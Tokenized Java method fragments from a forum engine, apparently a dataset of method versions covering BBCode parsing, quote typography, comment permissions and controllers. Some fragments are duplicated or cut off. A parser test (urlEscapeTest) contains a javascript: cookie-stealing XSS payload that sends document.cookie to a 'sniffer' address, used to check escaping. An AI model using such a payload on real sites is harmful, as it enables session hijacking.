public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , text ) ; } else { userDao . setRemark ( user , refUser , text ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public void updateRemark ( int id , String text ) { if ( text . length ( ) = = 0 ) jdbcTemplate . update ( " DELETE FROM user_remarks WHERE id=? " , id ) ; 
public boolean isCommentsEditingAllowed ( CommentRequest commentRequest , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; final boolean haveAnswers = commentService . isHaveAnswers ( commentRequest . getOriginal ( ) ) ; return isCommentEditableNow ( commentRequest . getOriginal ( ) , 
public boolean isCommentDeletableNow ( Comment comment , @Nullable User currentUser , Topic topic , boolean haveAnswers ) { if ( comment . isDeleted ( ) | | topic . isDeleted ( ) ) { return false ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } boolean moderatorMode = currentUser . isModerator ( ) ; boolean authored = currentUser . getId ( ) = = comment . getUserid ( ) ; long nowTimestamp = System . currentTimeMillis ( ) ; return moderatorMode | | ( ! topic . isExpired ( ) & & 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) > = LINK_FOLLOW_MIN_SCORE ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String text , boolean isCode ) { if ( ! isCode ) { text = changer . changeBatch ( text ) ; 
public String format ( String text , boolean secure , boolean nofollow ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure , nofollow ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) ; } 
public String simpleFormat ( String text ) { return StringUtil . escapeHtml ( text ) ; } 
private static boolean isQuoteChar ( char ch ) { return ch = = QUOTE_SYMBOL | | ch = = QUOTE_OUT_OPEN | | ch = = QUOTE_OUT_CLOSE | | 
private static boolean isPunctuation ( char ch ) { char [ ] punctuation = { '.' , ',' , ':' , ';' , '-' , '!' , '?' } ; for ( char test : punctuation ) if ( test = = ch ) return true ; return false ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = buff . charAt ( position + 1 ) ; before = buff . charAt ( position - 1 ) ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return true ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String text , boolean isCode ) { if ( ! isCode ) { text = changer . format ( text ) ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { text = changer . format ( text ) ; 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( tagName ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
private Node processCloseTag ( ParserAutomatonState automatonState , Node currentNode , boolean tagNameIsCode ) { if ( ! automatonState . isCode ( ) | | tagNameIsCode ) { currentNode = closeTagNode ( automatonState . getRootNode ( ) , currentNode , automatonState . getTagname ( ) ) ; } else { currentNode = pushTextNode ( automatonState , currentNode , automatonState . getWholematch ( ) ) ; } if ( tagNameIsCode ) { automatonState . setCode ( false ) ; } return currentNode ; } 
public void processTagMatcher ( Matcher match ) { tagname = match . group ( 1 ) . toLowerCase ( ) ; parameter = match . group ( 3 ) ; wholematch = match . group ( 0 ) ; if ( ! StringUtils . isEmpty ( parameter ) ) { parameter = parameter . substring ( 1 ) ; 
public boolean isTagEscaped ( ) { return wholematch . startsWith ( " [[ " ) & & wholematch . endsWith ( " ]] " ) ; } 
public boolean isCloseTag ( ParserAutomatonState automatonState ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
public boolean isFirstCode ( ) { return firstCode ; } 
public void parse ( ) { given when parser.parseRoot(rootNode, inputString); then String actualResult = rootNode.renderXHtml(); Assert.assertEquals(expectedResult, actualResult); } 
public static Collection < Object [ ] > data ( ) { Object [ ] [ ] data = new Object [ ] [ ] { { " [list][*]fdfdddfd[/list][[raw]] " , " <ul><li>fdfdddfd</li></ul><p>[[raw]]</p> " } , { " [list][*]fdfdddfd[list][[raw]] " , " <ul><li>fdfdddfd[[raw]]</li></ul> " } , { " [code][list][*]fdfdddfd[list][[raw]][/code][/code] " , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]fdfdddfd[list][[raw]]</code></pre></div> " } , } ; return Arrays . asList ( data ) ; } 
public void processTitle ( ) { given when String actualResult = StringUtil.processTitle("one -- two --- three -- four-- five --six --"); then Assert.assertEquals("one&nbsp;&mdash; two --- three&nbsp;&mdash; four-- five --six --", actualResult); } 
public void checkQuotesDecorator ( ) { given RuTypoChanger ruTypoChanger = new RuTypoChanger(); when String actualResult = ruTypoChanger.format(inputString); then Assert.assertEquals(expectedResult, actualResult); } 
public void checkQuotesDecoratorWithReset ( ) { given typoChanger.reset(); when String actualResult = typoChanger.format(inputString); then Assert.assertEquals(expectedResult, actualResult); } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public Set < Integer > get ( @Nonnull User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
private static char firstNonQuote ( String buff , int start ) { for ( int pt = start ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( String buff , int start ) { for ( int pt = start ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = lastNonQuote ( buff , position + 1 ) ; before = firstNonQuote ( buff , position - 1 ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return true ; } 
private static boolean isPunctuation ( char ch ) { for ( char test : PUNCTUATION ) if ( test = = ch ) return true ; return false ; } 
private static char firstNonQuote ( String buff , int start ) { for ( int pt = start - 1 ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( String buff , int start ) { for ( int pt = start + 1 ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private static boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = lastNonQuote ( buff , position ) ; before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return true ; } 
public static String processTitle ( String title ) { return title . replaceAll ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then Assert.assertEquals("&laquo;Test of &bdquo;quotes &quot; &bdquo;in quotes&ldquo; in title&ldquo;&raquo;", actualResult); } 
public void testInCodeQuotes ( ) { assertEquals ( " <p>Smth about &laquo;quotes&raquo;? Look here: <div class= \" code \" ><pre class= \" no-highlight \" ><code>I love to eat &quot;white&quot; icecream</code></pre></div></p> " , 
public void reset ( ) { this . quoteDepth = 0 ; this . localBuff = " " ; } 
private boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . equals ( " " ) ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( ! Character . isWhitespace ( after ) & & ! isPunctuation ( after ) & & ! isQuoteChar ( after ) ) return false ; return true ; } 
public void testLocalBuffer ( ) { assertEquals ( " <p>This is simple &laquo;local <u>buffer</u>&raquo; test </p> " , 
public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) String nocache , @RequestParam ( required = false ) Integer cid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Topic topic = messageDao . getById ( msgid ) ; String redirectUrl = topic . getLink ( ) ; StringBuilder options = new StringBuilder ( ) ; if ( page ! = null ) { redirectUrl = topic . getLinkPage ( page ) ; } if ( nocache ! = null ) { options . append ( " nocache= " ) ; options . append ( URLEncoder . encode ( nocache , " UTF-8 " ) ) ; } StringBuilder hash = new StringBuilder ( ) ; if ( options . length ( ) > 0 ) { return new ModelAndView ( new RedirectView ( redirectUrl + '?' + options + hash ) ) ; 
public RedirectView deleteImage ( @RequestParam ( required = true ) int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; imageService . deleteImage ( tmpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( topic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Topic topic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public static TopicLinkBuilder baseLink ( Topic topic ) { return new TopicLinkBuilder ( UriComponentsBuilder . fromUriString ( topic . getLink ( ) ) , topic , 0 ) ; } 
public static TopicLinkBuilder pageLink ( Topic topic , int page ) { return new TopicLinkBuilder ( UriComponentsBuilder . fromUriString ( topic . getLinkPage ( page ) ) , topic , page ) ; } 
public TopicLinkBuilder showDeleted ( ) { builder . queryParam ( " deleted " , " true " ) ; return this ; } 
public TopicLinkBuilder forceLastmod ( ) { builder . queryParam ( " lastmod " , topic . getLastModified ( ) . getTime ( ) ) ; return this ; } 
public TopicLinkBuilder comment ( int cid ) { builder . fragment ( " comment- " + cid ) ; return this ; } 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter builder.queryParam( "filter", CommentFilter.toString(filter) ); return this; } 
public String build ( ) { return builder . build ( ) . toUriString ( ) ; } 
public boolean followInTopic ( Topic topic , User author ) { return ! topic . isCommited ( ) & & followAuthorLinks ( author ) ; } 
public String parseTopicWithMinimizedCut ( String text , String cutURL , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareTopicRootNode ( true , cutURL , secure , nofollow ) , text ) . renderXHtml ( ) ; } 
public String parseTopic ( String text , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareTopicRootNode ( false , null , secure , nofollow ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { try { LorURL lorCutURL = new LorURL ( configuration . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public void inCodeEscape ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&amp;#9618;</code></pre></div> " , lorCodeService . parseTopic ( " [code]&#9618;[/code] " , false , false ) ) ; assertEquals ( " <p>&#9618;</p> " , 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/CUT][cut]test[/cut] " , false , false ) ) ; 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false , false ) ) ; 
public boolean followInTopic ( Topic topic , User author ) { return topic . isCommited ( ) | | followAuthorLinks ( author ) ; } 
public Integer apply ( Topic topic ) { return topic . getId ( ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { tags . put ( resultSet . getInt ( " msgid " ) , resultSet . getString ( " value " ) ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public boolean isHaveAnswers ( @Nonnull Comment comment ) { return commentDao . isHaveAnswers ( comment . getId ( ) ) ; } 
public boolean isCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic topic , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; final boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; return isCommentEditableNow ( comment , 
private boolean isQuoteClosing ( String buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . equals ( " " ) ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( Character . isLetterOrDigit ( after ) ) return false ; return true ; } 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&laquo;http:127.0.0.1/sniffer.pl?&bdquo;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&laquo;http:127.0.0.1/sniffer.pl?&raquo;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profileProperties . getAvatarMode ( ) ) ; } String userAgent ; if ( currentUser ! = null & & currentUser . isModerator ( ) ) { userAgent = userAgentDao . getUserAgentById ( message . getMessage ( ) . getUserAgent ( ) ) ; } else { userAgent = null ; } return new TopicMenu ( topicEditable , 
public List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; return deleted ; } 
public List < Integer > deleteWithReplys ( int msgid , String reason , User user , int scoreBonus ) { List < Integer > deleted = commentDao . doDeleteReplys ( msgid , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return doDeleteReplys ( msgid , user , score , 0 ) ; } 
public List < Integer > deleteWithReplys ( int msgid , String reason , User user , int scoreBonus ) { List < Integer > deleted = commentDao . deleteReplys ( msgid , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { text = automatonState . changer . format ( text ) ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { text = automatonState . getTypoChanger ( ) . format ( text ) ; 
private void doResize ( File uploadedFile ) throws IOException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static void resizeImage ( String filename , String iconname , int size ) throws IOException { BufferedImage source = ImageIO . read ( new File ( filename ) ) ; BufferedImage destination = Scalr . resize ( source , size ) ; ImageIO . write ( destination , " JPEG " , new File ( iconname ) ) ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " addphoto " ) ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TopicListController . tagListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { String avatarMode = profileProperties . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } String userAgent ; if ( currentUser ! = null & & currentUser . isModerator ( ) ) { userAgent = userAgentDao . getUserAgentById ( message . getMessage ( ) . getUserAgent ( ) ) ; } else { userAgent = null ; } return new TopicMenu ( topicEditable , 
public String apply ( Date input ) { return DateFormats . getShort ( ) . print ( input . getTime ( ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { String avatarMode = profileProperties . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } return new TopicMenu ( topicEditable , 
public void block ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; 
public void updateRemark ( int id , String text ) { if ( text . isEmpty ( ) ) { jdbcTemplate . update ( " DELETE FROM user_remarks WHERE id=? " , id ) ; 
public ModelAndView handleUserError ( UserErrorException ex ) { return new ModelAndView ( " lostpwd-form " , " error " , ex . getMessage ( ) ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) throws Exception { Topic topic = topicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { throw new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( topic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( topic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , topic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public List < Comment > getCommentsSubtree ( int parentId ) throws MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < > ( ) ; parentNode . buildList ( parentList ) ; return parentList ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment , secure ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . transform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( text , comment , comments , secure , tmpl , topic ) ) ; } return commentsPrepared ; } 
